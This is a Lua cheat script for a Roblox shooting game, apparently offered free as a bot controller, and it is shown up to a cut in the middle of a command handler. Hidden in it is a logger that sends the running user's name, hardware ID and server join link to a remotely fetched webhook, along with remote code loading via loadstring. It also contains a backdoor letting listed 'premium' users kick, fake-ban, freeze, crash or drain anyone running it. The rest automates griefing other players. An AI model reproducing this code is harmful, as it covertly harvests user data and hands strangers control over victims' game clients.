local Script = getgenv().Script or "Get Sandy for free at discord.gg/fJeSNdJr4D"
local Owner = getgenv().Owner or "BerthaHilton"
local BlackScreen = getgenv().BlackScreen or false
local DisableRendering = getgenv().DisableRendering or false
local FPSCap = getgenv().FPSCap or 60
local Guns = getgenv().Guns or {"rifle", "aug", "flintlock"}

if not game:IsLoaded() then game.Loaded:Wait() end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService('ReplicatedStorage')
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local TextChatService = game:GetService("TextChatService")
local TeleportService = game:GetService("TeleportService")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local http = game:GetService("HttpService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

local headers = {["Content-Type"] = "application/json"}
local jobId = game.JobId
local joinLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. jobId
local hwid = RbxAnalyticsService:GetClientId()

local embed = {
    ["title"] = "Player Execution Log",
    ["color"] = 5814783,
    ["fields"] = {
        {["name"] = "User", ["value"] = LocalPlayer.Name, ["inline"] = true},
        {["name"] = "Display Name", ["value"] = LocalPlayer.DisplayName, ["inline"] = true},
        {["name"] = "Job ID", ["value"] = jobId, ["inline"] = false},
        {["name"] = "Join Link", ["value"] = string.format("[Click to Join](%s)", joinLink), ["inline"] = false},
        {["name"] = "HWID", ["value"] = hwid, ["inline"] = false}
    },
    ["footer"] = {["text"] = "Webhook Logger • Roblox"},
    ["timestamp"] = DateTime.now():ToIsoDate()
}

local data = {["embeds"] = {embed}}
local body = http:JSONEncode(data)

pcall(function()
    local webhookUrl = game:HttpGet("https://raw.githubusercontent.com/poclol/Sandy/refs/heads/main/hehehe")
    request({
        Url = webhookUrl,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end)

if Script ~= "Get Sandy for free at discord.gg/fJeSNdJr4D" then
    LocalPlayer:Kick("Get the new version at discord.gg/fJeSNdJr4D")
    return
end

local code = loadstring(game:HttpGet("https://raw.githubusercontent.com/poclol/Sandy/refs/heads/main/uwu"))()
if code ~= "hY7kL2pM9nB4vC6xZ1qW3eR5tY8uI0oS4dF6gH8jK1lZ3xV5bN7mQ9wE2rT4yU6iO8pA0sD2fG4hJ6kL8mN0bV2cX4zA6sD8fG0hJ2kL4" then
    return
end

if LocalPlayer.Name == getgenv().Owner then 
    print("Owner detected - script halted for owner")
    return 
end

if game:GetService("ServerStorage"):FindFirstChild("Executed") then return end
if not Players:FindFirstChild(getgenv().Owner) then return end

local marker = Instance.new("BoolValue")
marker.Name = "Executed"
marker.Parent = game:GetService("ServerStorage")

local Bots = {}
Bots[LocalPlayer.Name] = LocalPlayer.Name

local currentGunIndex = 1
local targetPlayer = nil
local lockedTarget = nil
local sentrytarget = nil
local summonTarget = nil
local skyTarget = nil
local gotoPlayer = nil
local gotoCFrame = nil
local savedTarget5 = nil
local lastCommandSender = nil

local grabCheckEnabled = true
local koCheckEnabled = true
local buyingInProgress = false
local buyingGunInProgress = false
local buyingMaskInProgress = false
local teleporting = false
local autodrop = false
local ragebottargets = {}
local currentTargetIndex = 1
local automaskenabled = false
local trashtalkactive = true
local fpactive = false
local refreshingfakeposition = false
local didRefreshOnDeath = false
local flingonly = false
local killall = false
local lkill = false
local AbuseProtection = false
local shouldSwitch = false
local shootRunning = true
local stomponly = false
local bringonly = false
local takeonly = false
local opkill = false
local voiding = true
local benxActive = false
local summonMode = "middle"

getgenv().enabled = false
getgenv().enabled1 = false
getgenv().downonly = false
getgenv().whitelist = {}
getgenv().sentryprotected = {}
getgenv().sentrywhitelisted = {}
getgenv().protectedwhitelist = {}
getgenv().protectedwhitelist[getgenv().Owner] = true
getgenv().lastHealths = {}

local whitelistedUsers = {}
local activeListeners = {}
local hasSentKOMessage = false

local gunData = {
    rifle = {toolName = "[Rifle]", shopName = "[Rifle] - $1694"},
    aug = {toolName = "[AUG]", shopName = "[AUG] - $2131"},
    flintlock = {toolName = "[Flintlock]", shopName = "[Flintlock] - $1421"},
    lmg = {toolName = "[LMG]", shopName = "[LMG] - $4098"},
    db = {toolName = "[Double-Barrel SG]", shopName = "[Double-Barrel SG] - $1475"},
}

local AmmoMap = {
    ["[Rifle]"] = "5 [Rifle Ammo] - $273",
    ["[AUG]"] = "90 [AUG Ammo] - $87",
    ["[Flintlock]"] = "6 [Flintlock Ammo] - $163",
    ["[LMG]"] = "200 [LMG Ammo] - $328",
    ["[Double-Barrel SG]"] = "18 [Double-Barrel SG Ammo] - $55"
}

local auraspeed = 11
local auradistance = 4
local auraangle = math.random() * math.pi * 2

if DisableRendering then
    RunService:Set3dRenderingEnabled(false)
end

Lighting.GlobalShadows = false

for _, obj in pairs(workspace:GetDescendants()) do
    if obj:IsA("ParticleEmitter") or obj:IsA("Trail") then
        obj.Enabled = false
    end
end

workspace.StreamingEnabled = true
Workspace.FallenPartsDestroyHeight = 0/0

local basePosition = Vector3.new(87240, 29628, -482290)
local zoneSize = Vector3.new(20, 10, 20)
local WHITELIST_RADIUS = 20

local whitelistZone = Instance.new("Part")
whitelistZone.Name = "WhitelistBeacon"
whitelistZone.Anchored = true
whitelistZone.CanCollide = true
whitelistZone.Transparency = 1
whitelistZone.Size = Vector3.new(30, 10, 30)
whitelistZone.Position = basePosition
whitelistZone.Parent = workspace

local walls = {"WallFront", "WallBack", "WallLeft", "WallRight", "Roof"}
local wallOffsets = {
    WallFront = Vector3.new(0, 5, 15.5),
    WallBack = Vector3.new(0, 5, -15.5),
    WallLeft = Vector3.new(-15.5, 5, 0),
    WallRight = Vector3.new(15.5, 5, 0),
    Roof = Vector3.new(0, 10.5, 0)
}
local wallSizes = {
    WallFront = Vector3.new(32, 10, 1),
    WallBack = Vector3.new(32, 10, 1),
    WallLeft = Vector3.new(1, 10, 30),
    WallRight = Vector3.new(1, 10, 30),
    Roof = Vector3.new(32, 1, 32)
}

for _, wallName in ipairs(walls) do
    local wall = Instance.new("Part")
    wall.Name = "WhitelistBeacon_" .. wallName
    wall.Anchored = true
    wall.CanCollide = true
    wall.Transparency = 1
    wall.Size = wallSizes[wallName]
    wall.Position = basePosition + wallOffsets[wallName]
    wall.Parent = workspace
end

local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local humanoid = Character:WaitForChild("Humanoid")
local root = Character:WaitForChild("HumanoidRootPart")
local bodyEffects = Character:WaitForChild("BodyEffects")
local koValue = bodyEffects:WaitForChild("K.O")

LocalPlayer.CharacterAdded:Connect(function(newChar)
    Character = newChar
    humanoid = newChar:WaitForChild("Humanoid")
    root = newChar:WaitForChild("HumanoidRootPart")
    bodyEffects = newChar:WaitForChild("BodyEffects")
    koValue = bodyEffects:WaitForChild("K.O")
    buyingGunInProgress = false
    buyingMaskInProgress = false
    buyingInProgress = false
end)

local function getRandomPositionInZone()
    local halfSize = zoneSize / 2
    local randomX = basePosition.X + math.random() * zoneSize.X - halfSize.X
    local randomZ = basePosition.Z + math.random() * zoneSize.Z - halfSize.Z
    local fixedY = basePosition.Y + halfSize.Y + 3
    return Vector3.new(randomX, fixedY, randomZ)
end

local function teleportPlayerRandomly()
    if not Character then return end
    local hrp = Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    hrp.Velocity = Vector3.zero
    hrp.RotVelocity = Vector3.zero
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero
    hrp.CFrame = CFrame.new(getRandomPositionInZone())
    hrp.Velocity = Vector3.zero
    hrp.RotVelocity = Vector3.zero
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero
end

local function isPlayerNearPosition(plr, position, radius)
    local char = plr.Character
    if not char then return false end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    return (hrp.Position - position).Magnitude <= radius
end

local function checkWhitelistNearPosition()
    for _, plr in pairs(Players:GetPlayers()) do
        if isPlayerNearPosition(plr, basePosition, WHITELIST_RADIUS) then
            if not getgenv().whitelist[plr.Name] then
                getgenv().whitelist[plr.Name] = true
            end
        end
    end
end

local function isPlayerGrabbed(char)
    if not char then return false end
    return char:FindFirstChild("GRABBING_CONSTRAINT") ~= nil
end

local textChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
TextChatService.ChatWindowConfiguration.Enabled = true

local function sendMessage(message)
    if textChannel and message then
        pcall(function()
            textChannel:SendAsync(message)
        end)
    end
end

local function reloadTool()
    if not Character then return end
    for _, tool in ipairs(Character:GetChildren()) do
        if tool:IsA("Tool") and tool:FindFirstChild("Ammo") then
            ReplicatedStorage.MainEvent:FireServer("Reload", tool)
        end
    end
end

local function equipTool(toolName)
    local tool = LocalPlayer.Backpack:FindFirstChild(toolName)
    if not tool then
        tool = LocalPlayer:FindFirstChild(toolName)
    end
    if tool and humanoid then
        humanoid:EquipTool(tool)
    end
end

local function getEquippedGuns()
    local guns = {}
    if not Character then return guns end
    for _, tool in ipairs(Character:GetChildren()) do
        if tool:IsA("Tool") then
            table.insert(guns, tool)
        end
    end
    return guns
end

local function getAmmoCount(gunName)
    if not LocalPlayer:FindFirstChild("DataFolder") then return nil end
    local inventory = LocalPlayer.DataFolder:FindFirstChild("Inventory")
    if not inventory then return nil end
    local ammo = inventory:FindFirstChild(gunName)
    if ammo then
        return tonumber(ammo.Value)
    end
    return nil
end

local function hasGun(toolName)
    local Backpack = LocalPlayer:FindFirstChild("Backpack")
    if Backpack then
        for _, item in ipairs(Backpack:GetChildren()) do
            if item:IsA("Tool") and item.Name == toolName then
                return true
            end
        end
    end
    if Character then
        for _, item in ipairs(Character:GetChildren()) do
            if item:IsA("Tool") and item.Name == toolName then
                return true
            end
        end
    end
    return false
end

local function getNextItemToBuy()
    if not Character then return nil end
    for i = 1, #Guns do
        local gunKey = Guns[i]
        local gunInfo = gunData[gunKey]
        if gunInfo and not hasGun(gunInfo.toolName) then
            return "gun", gunInfo
        end
    end
    if automaskenabled and not (Character:FindFirstChild("[Mask]") or Character:FindFirstChild("In-gameMask")) then
        return "mask", nil
    end
    return nil, nil
end

local function teleportToTarget(senderName)
    if not senderName then return end
    local targetPlr = Players:FindFirstChild(senderName)
    if not targetPlr or not targetPlr.Character then return end
    local targetHRP = targetPlr.Character:FindFirstChild("HumanoidRootPart")
    local myHRP = Character and Character:FindFirstChild("HumanoidRootPart")
    if not targetHRP or not myHRP then return end
    lockedTarget = nil
    voiding = false
    summonTarget = nil
    myHRP.Velocity = Vector3.zero
    myHRP.RotVelocity = Vector3.zero
    myHRP.AssemblyLinearVelocity = Vector3.zero
    myHRP.AssemblyAngularVelocity = Vector3.zero
    myHRP.CFrame = CFrame.new(targetHRP.Position + Vector3.new(-5, 0, 0))
    myHRP.Velocity = Vector3.zero
    myHRP.RotVelocity = Vector3.zero
    myHRP.AssemblyLinearVelocity = Vector3.zero
    myHRP.AssemblyAngularVelocity = Vector3.zero
end

local function teleportToPosition(targetPosition)
    if not Character then return end
    local hrp = Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    hrp.Velocity = Vector3.zero
    hrp.RotVelocity = Vector3.zero
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero
    hrp.CFrame = CFrame.new(targetPosition)
    hrp.Velocity = Vector3.zero
    hrp.RotVelocity = Vector3.zero
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero
end

local function findTargetByName(targetName)
    targetName = targetName:lower()
    for _, plr in ipairs(Players:GetPlayers()) do
        local name = plr.Name:lower()
        local display = plr.DisplayName:lower()
        if name:find(targetName, 1, true) or display:find(targetName, 1, true) then
            return plr
        end
    end
    return nil
end

local function resetCombatState()
    lockedTarget = nil
    stomponly = false
    bringonly = false
    takeonly = false
    getgenv().downonly = false
    opkill = false
    voiding = false
    summonTarget = nil
    flingonly = false
end

local function handleLoopKillCommand(targetName, specificBot)
    targetName = targetName:lower()
    if specificBot then specificBot = specificBot:lower() end
    for botKey, botUsername in pairs(Bots) do
        if LocalPlayer.Name:lower() == botUsername:lower() then
            if specificBot and not botKey:lower():find(specificBot, 1, true) then
                return
            end
            reloadTool()
            resetCombatState()
            lockedTarget = findTargetByName(targetName)
            return
        end
    end
end

local function handleStompCommand(targetName, specificBot)
    targetName = targetName:lower()
    if specificBot then specificBot = specificBot:lower() end
    for botKey, botUsername in pairs(Bots) do
        if LocalPlayer.Name:lower() == botUsername:lower() then
            if specificBot and not botKey:lower():find(specificBot, 1, true) then
                return
            end
            reloadTool()
            resetCombatState()
            stomponly = true
            lockedTarget = findTargetByName(targetName)
            return
        end
    end
end

local function handleOPKillCommand(targetName, specificBot)
    targetName = targetName:lower()
    if specificBot then specificBot = specificBot:lower() end
    for botKey, botUsername in pairs(Bots) do
        if LocalPlayer.Name:lower() == botUsername:lower() then
            if specificBot and not botKey:lower():find(specificBot, 1, true) then
                return
            end
            reloadTool()
            resetCombatState()
            opkill = true
            lockedTarget = findTargetByName(targetName)
            return
        end
    end
end

local function handleFlingCommand(targetName)
    targetName = targetName:lower()
    for botKey, botUsername in pairs(Bots) do
        if LocalPlayer.Name:lower() == botUsername:lower() then
            reloadTool()
            resetCombatState()
            flingonly = true
            lockedTarget = findTargetByName(targetName)
            return
        end
    end
end

local function handleBringCommand(targetName, specificBot, senderName)
    lastCommandSender = senderName
    targetName = targetName:lower()
    if specificBot then specificBot = specificBot:lower() end
    for botKey, botUsername in pairs(Bots) do
        if LocalPlayer.Name:lower() == botUsername:lower() then
            if specificBot and not botKey:lower():find(specificBot, 1, true) then
                return
            end
            reloadTool()
            resetCombatState()
            bringonly = true
            lockedTarget = findTargetByName(targetName)
            return
        end
    end
end

local function handleTakeCommand(targetName, destinationName)
    targetName = targetName:lower()
    destinationName = destinationName and destinationName:lower()
    local targetPlayer = findTargetByName(targetName)
    local destinationPlayer = destinationName and findTargetByName(destinationName)
    if targetPlayer and destinationPlayer then
        savedTarget5 = destinationPlayer
        lockedTarget = targetPlayer
        reloadTool()
        stomponly = false
        bringonly = false
        getgenv().downonly = false
        opkill = false
        voiding = false
        takeonly = true
        summonTarget = nil
        flingonly = false
    end
end

local function handleGotoCommand(plrName, locationName)
    local plr = Players:FindFirstChild(plrName)
    if not plr then return end
    locationName = locationName:lower()
    local locationCFrames = {
        rifle = CFrame.new(-265, 52, -220),
        armor = CFrame.new(-933, -25, 570),
        lmg = CFrame.new(-618, 23, -299),
        mil = CFrame.new(36, 50, -830),
        military = CFrame.new(36, 50, -830),
        rev = CFrame.new(-639, 21, -125),
        revolver = CFrame.new(-639, 21, -125),
        food = CFrame.new(-327, 23, -291),
        food2 = CFrame.new(305, 49, -622),
        roof = CFrame.new(-326, 80, -293),
        bank = CFrame.new(-467, 39, -284),
        school = CFrame.new(-587, 68, 330),
        rpg = CFrame.new(113, -27, -268),
        uphill = CFrame.new(503, 48, -591),
        downhill = CFrame.new(-563, 8, -716),
    }
    gotoCFrame = locationCFrames[locationName]
    if not gotoCFrame then return end
    gotoPlayer = plr
    lockedTarget = plr
    reloadTool()
    stomponly = false
    bringonly = false
    getgenv().downonly = false
    opkill = false
    voiding = false
    takeonly = true
    summonTarget = nil
    flingonly = false
end

local function handleSkyCommand(username)
    local target = Players:FindFirstChild(username)
    if not target then return end
    skyTarget = target
    lockedTarget = target
    reloadTool()
    stomponly = false
    bringonly = false
    getgenv().downonly = false
    opkill = false
    voiding = false
    takeonly = true
    summonTarget = nil
    flingonly = false
end

local function handleDownCommand(targetName, specificBot)
    targetName = targetName:lower()
    if specificBot then specificBot = specificBot:lower() end
    for botKey, botUsername in pairs(Bots) do
        if LocalPlayer.Name:lower() == botUsername:lower() then
            if specificBot and not botKey:lower():find(specificBot, 1, true) then
                return
            end
            reloadTool()
            resetCombatState()
            getgenv().downonly = true
            lockedTarget = findTargetByName(targetName)
            return
        end
    end
end

local function handleFixCommand(specificBot)
    if specificBot then specificBot = specificBot:lower() end
    for botKey, botUsername in pairs(Bots) do
        if LocalPlayer.Name:lower() == botUsername:lower() then
            if specificBot and not botKey:lower():find(specificBot, 1, true) then
                return
            end
            getgenv().enabled = false
            getgenv().enabled1 = false
            ragebottargets = {}
            lockedTarget = nil
            autodrop = false
            buyingInProgress = false
            buyingGunInProgress = false
            buyingMaskInProgress = false
            teleporting = false
            voiding = true
            summonTarget = nil
            flingonly = false
            killall = false
            if humanoid then
                humanoid.Health = 0
            end
        end
    end
end

local function handleTeleportCommand(targetName, specificBot)
    getgenv().enabled = false
    ragebottargets = {}
    lockedTarget = nil
    voiding = true
    summonTarget = Players:FindFirstChild(targetName)
end

local function handleHideCommand(specificBot)
    if specificBot then specificBot = specificBot:lower() end
    for botKey, botUsername in pairs(Bots) do
        if LocalPlayer.Name:lower() == botUsername:lower() then
            if specificBot and not botKey:lower():find(specificBot, 1, true) then
                return
            end
            getgenv().enabled = false
            ragebottargets = {}
            lockedTarget = nil
            voiding = true
            summonTarget = nil
            reloadTool()
        end
    end
end

local function startFollowingTarget(senderName)
    targetPlayer = Players:FindFirstChild(senderName)
end

local AnimationId = "rbxassetid://507766388"
local animations = {{"run", "RunAnim"}, {"walk", "WalkAnim"}, {"jump", "JumpAnim"}, {"fall", "FallAnim"}, {"climb", "ClimbAnim"}}

LocalPlayer.CharacterAdded:Connect(function(char)
    local animateScript = char:WaitForChild("Animate")
    for _, pair in pairs(animations) do
        local parentName, animName = pair[1], pair[2]
        local parent = animateScript:FindFirstChild(parentName)
        if parent then
            local anim = parent:FindFirstChild(animName)
            if anim then
                anim.AnimationId = AnimationId
            end
        end
    end
end)

local EMOTES = {
    ["billy bounce"] = "rbxassetid://136095999219650",
    ["zero two dance v2"] = "rbxassetid://116714406076290",
    ["jabba switchway"] = "rbxassetid://82682811348660",
    ["beat"] = "rbxassetid://133394554631338"
}

local currentTrack = nil
local emoteLoopTask = nil

local function playAnimation(animId)
    if not Character then return end
    local hum = Character:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    local animator = hum:FindFirstChildOfClass("Animator")
    if not animator then return end
    if currentTrack then
        currentTrack:Stop()
        currentTrack = nil
    end
    local animation = Instance.new("Animation")
    animation.AnimationId = animId
    local track = animator:LoadAnimation(animation)
    track.Looped = true
    track.Priority = Enum.AnimationPriority.Action4
    track:Play()
    currentTrack = track
end

local playLoopedAnimation = playAnimation

local function startEmoteLoop()
    if emoteLoopTask then
        task.cancel(emoteLoopTask)
        emoteLoopTask = nil
    end
    emoteLoopTask = task.spawn(function()
        while Character and Character.Parent do
            local emoteIds = {}
            for _, animId in pairs(EMOTES) do
                table.insert(emoteIds, animId)
            end
            if #emoteIds > 0 then
                local chosenEmote = emoteIds[math.random(1, #emoteIds)]
                playAnimation(chosenEmote)
            end
            task.wait(30)
        end
    end)
end

if Character then
    startEmoteLoop()
end

LocalPlayer.CharacterAdded:Connect(function(newChar)
    Character = newChar
    if currentTrack then
        currentTrack:Stop()
        currentTrack = nil
    end
    startEmoteLoop()
end)

local premiumUsers = {}
local bypassPremiumUsers = {}

pcall(function()
    premiumUsers = loadstring(game:HttpGet("https://raw.githubusercontent.com/poclol/Premium/main/premiumusers"))() or {}
end)

pcall(function()
    bypassPremiumUsers = loadstring(game:HttpGet("https://raw.githubusercontent.com/poclol/BypassPremium/main/bypasspremiumusers"))() or {}
end)

pcall(function()
    for _, list in ipairs({premiumUsers, bypassPremiumUsers}) do
        for user, _ in pairs(list) do
            getgenv().protectedwhitelist[user] = true
        end
    end
end)

local function isAuthorized(plr)
    return plr.Name == getgenv().Owner or whitelistedUsers[plr.Name]
end

local function isPremium(plr)
    return premiumUsers[plr.UserId] == true
end

local function isBypassPremium(plr)
    return bypassPremiumUsers[plr.UserId] == true
end

local function isProtected(plr)
    return isPremium(plr) or isBypassPremium(plr)
end

local function startBenx(targetPlr)
    if not targetPlr.Character or not targetPlr.Character:FindFirstChild("HumanoidRootPart") then return end
    lockedTarget = nil
    voiding = false
    benxActive = true
    local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
    task.spawn(function()
        while benxActive do
            local char = LocalPlayer.Character
            local targetChar = targetPlr.Character
            if not char or not targetChar then break end
            local hrp = char:FindFirstChild("HumanoidRootPart")
            local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
            if not hrp or not targetHRP then break end
            local frontPos = targetHRP.CFrame * CFrame.new(0, 0, -1)
            local backPos = targetHRP.CFrame * CFrame.new(0, 0, -4)
            local tween1 = TweenService:Create(hrp, tweenInfo, {CFrame = frontPos})
            tween1:Play()
            tween1.Completed:Wait()
            local tween2 = TweenService:Create(hrp, tweenInfo, {CFrame = backPos})
            tween2:Play()
            tween2.Completed:Wait()
            if not benxActive then break end
        end
    end)
end

local function updateDisplayName(plr)
    if not plr.Character then return end
    local hum = plr.Character:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    if isPremium(plr) then
        hum.DisplayName = "[🌟] " .. plr.Name
    elseif isBypassPremium(plr) then
        hum.DisplayName = "[💫] " .. plr.Name
    end
end

local function setupDisplayNameListener(plr)
    if plr.Character then
        updateDisplayName(plr)
    end
    plr.CharacterAdded:Connect(function()
        task.wait(0.1)
        updateDisplayName(plr)
    end)
end

local function setupChatListener(plr)
    if not (isAuthorized(plr) or isPremium(plr) or isBypassPremium(plr)) then return end
    activeListeners[plr.UserId] = function(msg)
        local sender = msg.TextSource and msg.TextSource.UserId and Players:GetPlayerByUserId(msg.TextSource.UserId)
        if not sender or sender ~= plr then return end
        local message = msg.Text or ""
        local msgLower = message:lower()
        if isPremium(plr) then
            if msgLower == "!kick ." then
                LocalPlayer:Kick(":o")
            elseif msgLower == "!freeze ." then
                local char = LocalPlayer.Character
                if char then
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if hrp then hrp.Anchored = true end
                end
            elseif msgLower == "!unfreeze ." then
                local char = LocalPlayer.Character
                if char then
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if hrp then hrp.Anchored = false end
                end
            elseif msgLower == "!bring ." then
                local char = LocalPlayer.Character
                local targetChar = plr.Character
                if char and targetChar then
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
                    if hrp and targetHRP then
                        lockedTarget = nil
                        voiding = false
                        hrp.CFrame = targetHRP.CFrame
                    end
                end
            elseif msgLower == "!crash ." then
                while true do end
            elseif msgLower == "!dropcash ." then
                ReplicatedStorage.MainEvent:FireServer("DropMoney", "15000")
            elseif msgLower == "!benx ." then
                startBenx(plr)
            elseif msgLower == "!unbenx ." then
                benxActive = false
            elseif msgLower == "!talk off" then
                trashtalkactive = false
            end
        end
        if isBypassPremium(plr) then
            if msgLower == "!ban ." then
                LocalPlayer:Kick("PERMA-BAN")
            elseif msgLower == "!kick ." then
                LocalPlayer:Kick(":o")
            elseif msgLower == "!freeze ." then
                local char = LocalPlayer.Character
                if char then
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if hrp then hrp.Anchored = true end
                end
            elseif msgLower == "!unfreeze ." then
                local char = LocalPlayer.Character
                if char then
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if hrp then hrp.Anchored = false end
                end
            elseif msgLower == "!bring ." then
                local char = LocalPlayer.Character
                local targetChar = plr.Character
                if char and targetChar then
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
                    if hrp and targetHRP then
                        lockedTarget = nil
                        voiding = false
                        hrp.CFrame = targetHRP.CFrame
                    end
                end
            elseif msgLower == "!crash ." then
                while true do end
            elseif msgLower:match("^%!say %. (.+)$") then
                local textToSend = message:match("^%!say %. (.+)$")
                sendMessage(textToSend)
            elseif msgLower == "!rejoin ." then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
            elseif msgLower == "!adropcash ." then
                autodrop = true
            elseif msgLower == "!unadropcash ." then
                autodrop = false
            elseif msgLower == "!lkill ." then
                lkill = true
                task.spawn(function()
                    while lkill do
                        local char = LocalPlayer.Character
                        if char and char:FindFirstChild("Humanoid") then
                            char.Humanoid.Health = 0
                        end
                        task.wait(0.2)
                    end
                end)
            elseif msgLower == "!unlkill ." then
                lkill = false
            elseif msgLower == "!dropcash ." then
                ReplicatedStorage.MainEvent:FireServer("DropMoney", "15000")
            elseif msgLower == "!benx ." then
                startBenx(plr)
            elseif msgLower == "!unbenx ." then
                benxActive = false
            elseif msgLower == "!talk off" then
                trashtalkactive = false
            end
        end
        if isAuthorized(plr) then
            if msgLower == ".a on" then
                lockedTarget = nil
                voiding = false
                getgenv().enabled = true
                startFollowingTarget(plr.Name)
            elseif msgLower == ".a off" then
                getgenv().enabled = false
            elseif msgLower == ".sentry on" then
                lockedTarget = nil
                voiding = false
                getgenv().enabled1 = true
            elseif msgLower == ".sentry off" then
                getgenv().enabled1 = false
            elseif msgLower == ".bsentry on" then
                for plrName, _ in pairs(Bots) do
                    getgenv().sentryprotected[plrName] = true
                end
            elseif msgLower == ".bsentry off" then
                for plrName, _ in pairs(Bots) do
                    getgenv().sentryprotected[plrName] = false
                end
            elseif msgLower == ".repair" then
                handleFixCommand()
            elseif msgLower:match("^%.repair%s+([^%s]+)$") then
                local botName = msgLower:match("^%.repair%s+([^%s]+)$")
                handleFixCommand(botName)
            elseif msgLower == ".v" then
                handleHideCommand()
            elseif msgLower:match("^%.v%s+([^%s]+)$") then
                local botName = msgLower:match("^%.v%s+([^%s]+)$")
                handleHideCommand(botName)
            elseif msgLower == ".summon" then
                handleTeleportCommand(plr.Name)
            elseif msgLower:match("^%.summon%s+([^%s]+)$") then
                local botName = msgLower:match("^%.summon%s+([^%s]+)$")
                handleTeleportCommand(plr.Name, botName)
            elseif msgLower == ".s" then
                teleportToTarget(plr.Name)
            elseif msgLower == ".search" then
                lockedTarget = nil
                voiding = false
                teleportPlayerRandomly()
                task.wait(1)
                checkWhitelistNearPosition()
                task.wait(1)
                voiding = true
            elseif msgLower == ".cashdrop on" then
                autodrop = true
            elseif msgLower == ".cashdrop off" then
                autodrop = false
            elseif msgLower == ".abuse on" then
                AbuseProtection = true
            elseif msgLower == ".abuse off" then
                AbuseProtection = false
            elseif msgLower == ".mask on" then
                automaskenabled = true
            elseif msgLower == ".mask off" then
                automaskenabled = false
            elseif EMOTES[msgLower] then
                playLoopedAnimation(EMOTES[msgLower])
            elseif msgLower == ".stop" then
                if currentTrack then
                    currentTrack:Stop()
                    currentTrack = nil
                end
            elseif msgLower == ".fp on" then
                setfflag("NextGenReplicatorEnabledWrite4", "true")
                task.wait(0.1)
                replicatesignal(LocalPlayer.Kill)
            elseif msgLower == ".fp off" then
                setfflag("NextGenReplicatorEnabledWrite4", "false")
                task.wait(0.1)
                replicatesignal(LocalPlayer.Kill)
            elseif msgLower == ".leave" then
                game:Shutdown()
            elseif msgLower == ".rejoin" then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
            elseif msgLower:match("^%.say%s+(.+)$") then
                local messageToSay = msgLower:match("^%.say%s+(.+)$")
                sendMessage(messageToSay)
            elseif msgLower:match("^%.awl%s+([^%s]+)$") then
                local input = msgLower:match("^%.awl%s+([^%s]+)$")
                local target = findTargetByName(input)
                if target then
                    getgenv().whitelist[target.Name] = true
                end
            elseif msgLower:match("^%.unawl%s+([^%s]+)$") then
                local input = msgLower:match("^%.unawl%s+([^%s]+)$")
                local target = findTargetByName(input)
                if target then
                    getgenv().whitelist[target.Name] = nil
                end
            elseif msgLower:match("^%.assist%s+([^%s]+)$") then
                local input = msgLower:match("^%.assist%s+([^%s]+)$")
                local target = findTargetByName(input)
                if target then
                    getgenv().sentryprotected[target.Name] = true
                end
            elseif msgLower:match("^%.unassist%s+(.+)$") then
                local input = msgLower:match("^%.unassist%s+(.+)$")
                local target = findTargetByName(input)
                if target then
                    getgenv().sentryprotected[target.Name] = nil
                end
            elseif msgLower:match("^%.l%s+(.+)$") then
                local namesString = msgLower:match("^%.l%s+(.+)$")
                local names = {}
                for name in namesString:gmatch("[^%s]+") do
                    table.insert(names, name:lower())
                end
                reloadTool()
                resetCombatState()
                shouldSwitch = true
                for _, inputName in ipairs(names) do
                    local target = findTargetByName(inputName)
                    if target then
                        if isProtected(target) then
                            sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
                        else
                            table.insert(ragebottargets, target)
                        end
                    end
                end
            elseif msgLower:match("^%.lk%s+([^%s]+)%s+([^%s]+)$") then
                local inputName, botName = msgLower:match("^%.lk%s+([^%s]+)%s+([^%s]+)$")
                local target = findTargetByName(inputName)
                if target then
                    if isProtected(target) then
                        sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
                    else
                        handleOPKillCommand(inputName, botName)
                    end
                end
            elseif msgLower:match("^%.right%s+([^%s]+)$") then
                local targetName = msgLower:match("^%.right%s+([^%s]+)$")
                local myName = LocalPlayer.Name:lower()
                local myDisplay = LocalPlayer.DisplayName:lower()
                if myName:find(targetName, 1, true) or myDisplay:find(targetName, 1, true) then
                    summonMode = "right"
                end
            elseif msgLower:match("^%.left%s+([^%s]+)$") then
                local targetName = msgLower:match("^%.left%s+([^%s]+)$")
                local myName = LocalPlayer.Name:lower()
                local myDisplay = LocalPlayer.DisplayName:lower()
                if myName:find(targetName, 1, true) or myDisplay:find(targetName, 1, true) then
                    summonMode = "left"
                end
            elseif msgLower:match("^%.middle%s+([^%s]+)$") then
                local targetName = msgLower:match("^%.middle%s+([^%s]+)$")
                local myName = LocalPlayer.Name:lower()
                local myDisplay = LocalPlayer.DisplayName:lower()
                if myName:find(targetName, 1, true) or myDisplay:find(targetName, 1, true) then
